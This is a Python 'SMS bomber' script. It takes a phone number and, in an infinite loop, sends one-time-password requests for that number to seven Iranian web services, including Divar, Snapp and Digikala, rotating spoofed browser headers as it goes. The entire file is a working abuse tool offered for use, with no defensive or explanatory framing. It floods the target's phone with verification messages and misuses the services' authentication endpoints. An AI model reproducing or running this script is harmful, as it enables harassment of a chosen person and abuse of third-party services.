import requests
import time 
import random




time.sleep(1.5)
print("""

$$$$$$$\   $$$$$$\  $$\      $$\ $$$$$$$\  $$$$$$$$\ $$$$$$$\          $$$$$$\  $$\      $$\  $$$$$$\  
$$  __$$\ $$  __$$\ $$$\    $$$ |$$  __$$\ $$  _____|$$  __$$\        $$  __$$\ $$$\    $$$ |$$  __$$\ 
$$ |  $$ |$$ /  $$ |$$$$\  $$$$ |$$ |  $$ |$$ |      $$ |  $$ |       $$ /  \__|$$$$\  $$$$ |$$ /  \__|
$$$$$$$\ |$$ |  $$ |$$\$$\$$ $$ |$$$$$$$\ |$$$$$\    $$$$$$$  |$$$$$$\\$$$$$$\  $$\$$\$$ $$ |\$$$$$$\  
$$  __$$\ $$ |  $$ |$$ \$$$  $$ |$$  __$$\ $$  __|   $$  __$$< \______|\____$$\ $$ \$$$  $$ | \____$$\ 
$$ |  $$ |$$ |  $$ |$$ |\$  /$$ |$$ |  $$ |$$ |      $$ |  $$ |       $$\   $$ |$$ |\$  /$$ |$$\   $$ |
$$$$$$$  | $$$$$$  |$$ | \_/ $$ |$$$$$$$  |$$$$$$$$\ $$ |  $$ |       \$$$$$$  |$$ | \_/ $$ |\$$$$$$  |
\_______/  \______/ \__|     \__|\_______/ \________|\__|  \__|        \______/ \__|     \__| \______/ 
                                                                                                       
                                                                                                       
                                                                                                       

""")
print("""
---------------------
|                    |
|   M9X9T9:)   |
|   HELLO.           |
|                    |
---------------------
""")

number = input("Enter your phone [0-98:]")
print("**********")
url_divar = "https://api.divar.ir/v5/auth/authenticate"
json_divar = {"phone":number}

url_sh = "https://www.sheypoor.com/api/v10.0.0/auth/send"
json_sh = {"username": "0" + number}


url_sn = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
json_sn = {"cellphone":"+98" + number}

url_al = "	https://ws.alibaba.ir/api/v3/account/mobile/otp"
json_al = {"phoneNumber":"0" + number}

url_box = "https://app.snapp-box.com/api/v2/auth/otp/send"
json_box = {"phoneNumber":"0" + number}


url_digi = "https://api.digikala.com/v1/user/authenticate/"
json_digi = {"username":"0" + number}

url_fi = "https://www.filimo.com/api/fa/v1/user/Authenticate/signin_step1"
json_fi = {"account":"0" + number}

heads = [
    {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0',
        'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11;Ubuntu ; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
]


while True:
    random_head = random.choice(heads)
    req = requests.post(url=url_divar,json=json_divar,headers=random_head)
    print("send message#")

    req2 = requests.post(url=url_sh,json=json_sh,headers=random_head)
    print("send message#")

    req3 = requests.post(url=url_sn,json=json_sn,headers=random_head)
    print("send message#")

    req4 = requests.post(url=url_al,json=json_al,headers=random_head)
    print("send message#")
    
    req5 = requests.post(url=url_box,json=json_box,headers=random_head)
    print("send message#")

    req6 = requests.post(url=url_digi,json=json_digi,headers=random_head)
    print("send message#")

    req7 = requests.post(url=url_fi,json=json_fi,headers=random_head)
    print("send message#")
    time.sleep(2)
